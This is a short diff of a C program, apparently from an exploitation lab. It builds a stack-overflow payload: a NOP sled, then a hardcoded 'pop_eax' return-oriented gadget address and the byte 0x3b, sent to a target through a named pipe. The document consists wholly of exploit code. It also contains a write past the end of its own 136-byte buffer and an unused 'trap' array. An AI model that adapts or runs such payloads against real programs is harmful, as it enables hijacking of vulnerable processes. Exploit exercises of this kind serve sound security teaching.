@@ -8,12 +8,14 @@
 int main(void)
 {
   char bufr[136];
-  char add[] = "\x01\x20\xa7\xbb";
+  char trap[] = "\xe5\xb6\xa9\xbb";
+  char pop_eax[] = "\xe1\xa0\xb9\xbb";
   int i;
   for(i = 0; i < 131; i++)
     memcpy(bufr + i, "\x90",1);
   
-  strcpy(bufr + 131, add);
+  strcpy(bufr + 131, pop_eax);
+  strcpy(bufr + 136, "\x3b");
   writecmd(PIPEPATH, bufr);
   
   return 0;
